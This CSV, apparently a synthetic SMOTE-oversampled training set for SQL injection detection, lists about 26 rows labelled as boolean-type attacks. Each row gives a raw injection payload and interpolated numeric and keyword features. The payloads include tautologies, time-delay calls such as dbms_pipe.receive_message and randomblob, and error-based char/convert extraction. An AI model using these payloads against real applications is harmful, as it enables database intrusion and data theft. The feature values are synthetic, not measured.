id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001026,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.8960785964113726,71.7453356400445,24.438641112627842,3.797584345683822,24.07971659886174,16.83742392582481,23.03985829943087,7.788336815927082,0.2913636034495711,0.2753035224441436,0.32448517433232416,0.10884769977396117,0.0,1.0,2.0,0.0,0.16257607417518938,2.0,0.0,1.8128803708759467,0.0,0.0,0.32515214835037876,4.162576074175189,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.16257607417518938,0.0,1.0,0.16257607417518943,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3251521483503788
SMOTE_001027,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.361230258494493,189.70461508337308,36.26795821090584,3.901051386378005,57.16303885083433,25.3397910545292,72.9144538035161,34.28733137449345,0.3018611387858132,0.13578538284471103,0.38212941022992447,0.18022406813955122,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.679582109058405,0.5359164218116809,2.0,1.8038746327175215,10.535916421811681,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.7320417890941595,0.0,0.7320417890941595,0.0,0.2679582109058405,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8757074763408834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.607749265435043
SMOTE_001028,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.1445403369915568,144.04380117754962,39.35919975209482,4.053466833683884,51.12640198324147,22.19899969011852,51.077599256284444,19.640800247905183,0.3520748149587662,0.15501114934499424,0.3567207461314706,0.13619328956476898,3.0,0.0,2.0,0.839799938023704,0.16020006197629602,2.0,0.0,8.359199752094817,0.0,0.8010003098814797,1.4806001859288882,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.160200061976296,0.0,1.0,0.16020006197629594,0.160200061976296,0.839799938023704,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3204001239525915
SMOTE_001029,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.03322262483449065,356.0524151705996,40.962560592428844,3.7897875192605093,118.91388936258633,35.08611063741367,149.05990305211384,52.99251211848577,0.3339895779515592,0.09853341068894836,0.418641934604716,0.14883507675477645,3.9850242369715367,0.0,0.011231822271347669,0.0,0.0,1.0074878815142316,0.0,32.00748788151424,0.0,1.9925121184857686,3.9887681777286526,11.018719703785578,0.9962560592428842,0.0,0.00374394075711576,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9962560592428842,1.0037439407571158,0.0,0.003743940757115982,0.9962560592428842,0.9962560592428841,0.0037439407571158156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0037439407571158295,0.0,0.0,0.0,0.0,7.018719703785578,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.026207585299812
SMOTE_001030,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,3.5897094037928916,334.8741659570227,33.04169755714731,3.5016961201854255,89.09992586284645,46.15815416854561,150.29114152849576,49.32494439713484,0.2739145247516339,0.13442914530141248,0.440792604264094,0.1508637256828596,1.6333580457178476,0.0,0.5916604885705381,0.0,0.0,2.591660488570538,0.0,31.466567817128606,0.0,0.8166790228589238,2.225018534288386,13.183320977141076,0.40833951142946184,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4083395114294619,1.1833209771410762,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5916604885705381,0.0,0.0,0.0,0.0,9.95830244285269,0.0,0.0,0.0,0.0,0.0,0.0,0.5916604885705381,0.5916604885705381,14.916604885705379
SMOTE_001031,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.8256404994173566,54.738280994333806,19.151855372875172,3.555354798810455,8.673665290014021,20.956380165722297,17.912760331444602,7.195475207152871,0.1545545519290888,0.38918004144079305,0.32706535094532974,0.12920005568478837,0.0,0.23909504143057472,3.0,0.0,0.0,2.0,0.0,1.4781900828611487,0.0,0.2390950414305747,0.23909504143057436,5.0,0.0,0.2390950414305748,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001032,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.408815957992474,237.40510186061397,36.4202550930307,3.769866235518117,70.3282822558611,28.0337584883845,95.36204074424559,43.681020372122795,0.2959938110967463,0.11849850002443499,0.4017049777789625,0.1838027110998562,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.840510186061397,2.0,1.8067516976768996,3.8067516976768996,11.227006790707598,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.613503395353799,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.6135033953538
SMOTE_001033,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.08981191913415272,249.21956909752555,36.963405150412406,3.770943927994739,74.29275879670074,29.0,100.0,45.92681030082481,0.2980809327846538,0.11636557990663453,0.4012606203677052,0.1842928669410064,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.9268103008248143,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001034,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.8988001824397587,122.51645369539185,31.832493256610462,4.029979201326498,54.64097212732325,16.344500449559302,38.320486063661626,13.210495054847673,0.4029946047488254,0.17286165844696202,0.3160334369372078,0.10811029986700471,0.0,1.0,2.0,0.0,0.6554995504406977,2.0,0.0,4.277497752203487,0.0,0.0,1.310999100881395,4.655499550440697,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6554995504406976,0.0,1.0,0.6554995504406977,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3109991008813955
SMOTE_001035,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,0.16155103915360144,110.55631662899489,31.912160532263965,3.691327939654612,32.9662341450964,14.79504124194925,45.85360088710661,16.94144035484264,0.29714472331450087,0.13418673623534136,0.4152435188617309,0.15342502158842689,2.9121605322639637,0.0,2.0,0.9707201774213212,0.029279822578678838,1.0,0.0,8.912160532263963,0.0,0.0,1.0292798225786788,4.0,0.9707201774213212,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.02927982257867867,0.0,0.0,0.029279822578678782,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0585596451573585
SMOTE_001036,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.478329180484911,159.51666365703957,36.24166817148022,4.239563539025248,77.51666365703956,17.516663657039558,42.93334537184176,21.549990971118678,0.48593221597615677,0.10978505693432031,0.26927025512484415,0.13501247196467872,2.2749954855593386,0.24166817148022043,2.0,0.0,1.0,2.0,0.0,5.24166817148022,0.0,3.7916591425988972,3.516663657039559,5.758331828519779,0.7583318285197795,0.24166817148022043,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7583318285197795,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.758331828519779
SMOTE_001037,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,1.4847496725051668,157.88818680454568,34.444336431468564,3.933302968713462,60.33398141118861,13.110355020279954,58.3330092944057,26.110841078671413,0.3835949059158163,0.08192101229254747,0.36935444672710366,0.16512963506453252,3.2221682157342824,0.0,0.0,0.0,0.0,0.44433643146856516,0.0,12.0,0.0,2.0,1.0,6.888672862937129,1.0,0.0,0.0,0.0,0.0,0.22216821573428247,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.22216821573428244,0.7778317842657175,0.7778317842657175,0.22216821573428247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001038,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.2535284927097584,191.82183161265223,34.12826507330237,3.7711241825165405,55.89785551311661,24.555815317643617,77.02612058641898,34.342040195473,0.29130602662689425,0.1277585877441849,0.4016905817672294,0.17924480386169148,3.8289799022635016,0.0,0.08551004886824898,0.0,0.0,2.0,0.0,16.256530146604746,1.914489951131751,1.0427550244341244,3.0427550244341246,8.256530146604748,0.9572449755658755,0.0,0.04275502443412443,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.042755024434124544,0.0,0.9572449755658754,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.085510048868249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.085510048868249
SMOTE_001039,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.41179576729546685,253.99325584107868,36.16779069315355,3.791981336699348,80.6576744547716,29.0,100.0,44.3355813863071,0.3174779117568045,0.11418529932449353,0.39374241146377087,0.17459437745493106,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.33558138630710177,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001040,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.5342380138477703,117.05990509233126,30.830933051203026,4.082366285733266,51.463995768045415,16.0,35.154665256015136,14.441244068270704,0.41646388115669847,0.14870364016998014,0.3061128889101271,0.12871958976319428,0.0,2.169066948796972,1.610311017067676,0.0,0.6103110170676758,1.610311017067676,0.0,4.610311017067676,0.0,0.3896889829323241,1.610311017067676,3.830933051203028,0.0,1.0,0.6103110170676758,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6103110170676758,0.0,0.6103110170676758,0.610311017067676,0.3896889829323241,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2206220341353515
SMOTE_001041,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.3968458210645445,153.09817935552974,34.44152437060349,4.1835111313516276,75.10568811683505,15.773606243719268,41.0,21.218884994975415,0.4911459355117388,0.10126016330404786,0.26996001193911245,0.1376338892451009,2.33208187311578,0.0,2.0,0.0,1.0,1.7773606243719269,0.0,5.222639375628074,0.0,3.886803121859633,3.5547212487438538,5.554721248743854,0.7773606243719268,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7773606243719269,0.0,0.7773606243719267,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.554721248743854
SMOTE_001042,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,2.2072064369245674,152.83158617121094,33.0,3.7116383360925504,43.16621971821675,19.99975620993641,62.99926862980923,26.666341613248548,0.28445849763000247,0.13020494648622777,0.4117299605687994,0.17360659531497036,5.1667072983439315,0.0,0.0,0.5833536491719657,0.0,2.0,0.0,12.166463508280343,2.0,0.41664635082803425,1.8332927016560685,5.083231754140171,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.41664635082803436,0.0,0.0,0.0,0.0,1.4166463508280343,0.5833536491719657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0832317541401713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.083231754140171
SMOTE_001043,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.402510122083645,182.32683175197414,34.635539833145316,3.8264857511443426,53.72892033370936,24.0,71.86899108455543,32.72892033370936,0.2949984314913231,0.13202809391385173,0.3934996252781223,0.17947384931670282,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.728920333709363,1.3644601668546814,1.3177699165726593,2.364460166854681,8.63553983314532,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.31776991657265935,0.0,0.31776991657265935,0.0,0.6822300834273406,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.411150417136703,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.728920333709363
SMOTE_001044,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,4.893060028212327,43.773206908778064,17.79553448479634,3.2281488780914342,6.602232757601826,8.522913797858132,18.920681040256298,9.72737931306179,0.19522318000295408,0.15789080465879687,0.42466379311602676,0.2222222222222222,1.8636896565308954,0.5340775858672762,0.46592241413272373,1.0681551717345523,1.0,0.9318448282654477,0.0,2.9318448282654472,0.9318448282654477,0.0,-2.220446049250313e-16,3.465922414132724,0.46592241413272384,0.5340775858672762,0.0,0.0,0.534077585867276,0.46592241413272384,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.46592241413272384,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4659224141327245
SMOTE_001045,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.2893092507846602,157.4923583130977,36.64465081916839,4.179458994880615,75.94923583130978,15.593886650478156,48.79694332523908,17.15229250607069,0.48231953598834754,0.09886915659279788,0.30981831543132,0.10899299198753457,0.0,1.152292506070691,1.8984716626195393,0.0,1.0,2.0,0.0,6.0,0.10152833738046074,0.0,2.0,4.8984716626195395,0.0,1.0,0.9492358313097695,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9492358313097695,1.0,1.0507641686902303,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001046,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.9808123291736834,234.94462759204674,35.392261442183234,3.7882101211789676,73.79552946947368,27.480653605458087,92.70713730619882,40.961307210916175,0.31228136844419446,0.11775438259617088,0.39518326079211585,0.17478098816751877,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.176784326549704,0.6077385578167652,1.6961307210916174,3.696130721091617,10.78452288436647,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.392261442183235,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.392261442183235
SMOTE_001047,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.8774899299426047,224.11250195324257,35.755625097662126,3.7697400584759877,66.11895895186015,26.92604182943688,90.04500078129703,41.02250039064851,0.29462390587690923,0.12082875117158048,0.4018179596527635,0.18272938329874677,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.511250195324255,2.0,1.5852083658873761,3.585208365887376,10.340833463549505,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.170416731774752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.170416731774752
SMOTE_001048,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.8471240346096821,221.30793407779032,33.95727759883871,3.697888382695955,63.53856109085484,27.95727759883871,91.77788049056453,38.03421489753226,0.2828511041275153,0.12885389290507443,0.4143610349954366,0.17393396797197372,4.0,0.0,0.0,0.0,0.0,1.880340300145161,0.0,19.675235797967744,1.7606806002903224,1.1196596998548387,3.1196596998548385,8.358979099564516,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.11965969985483882,0.0,0.0,0.11965969985483882,1.880340300145161,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.239319399709678,0.0,0.0,0.0,0.0,0.0,0.0,0.1196596998548388,0.1196596998548388,7.598298499274194
SMOTE_001049,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.6902709907280244,78.98888047913623,23.81651012643873,3.2161632108901266,19.509410192985428,12.41574003992802,34.80154017302142,12.26219007320137,0.19961505882680325,0.17964071703469822,0.4647562002373419,0.1559880239011566,2.13858001330934,0.0,1.13858001330934,0.56929000665467,0.0,1.0,0.0,6.4157400399280196,0.43070999334533,0.0,0.56929000665467,2.7078700199640098,1.0,0.0,0.56929000665467,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001050,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,1.4329289733379542,367.73927505826384,32.614803529811525,3.480890697388315,99.7140481185665,54.2859518814335,162.41631435230158,51.3229607059623,0.2715398375210771,0.14731949774332745,0.4415203152576529,0.13962034947794258,0.6459214119246093,0.0,2.5155589410565433,0.0,0.0,2.6770392940376952,0.0,33.6770392940377,0.0,0.32296070596230453,1.4844410589434567,15.19259823509424,0.16148035298115226,0.0,0.8385196470188476,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.16148035298115226,1.8385196470188476,0.0,0.8385196470188477,0.1614803529811523,0.16148035298115226,0.8385196470188478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8385196470188477,0.0,0.0,0.0,0.0,11.192598235094238,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.869637529131932
SMOTE_001051,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,0.9534220581916591,133.71086210438432,30.06374305582872,3.9838372293985103,66.97552281796762,9.51963293689817,41.0,16.215706349518534,0.5013874228068237,0.06968729418724755,0.30847164019962414,0.12045364280630455,0.45588988106945094,0.0,2.0,0.0,1.0,1.151963293689817,0.0,5.848036706310182,0.0,0.7598164684490848,2.303926587379634,4.3039265873796335,0.15196329368981698,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.151963293689817,0.0,0.15196329368981704,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3039265873796335
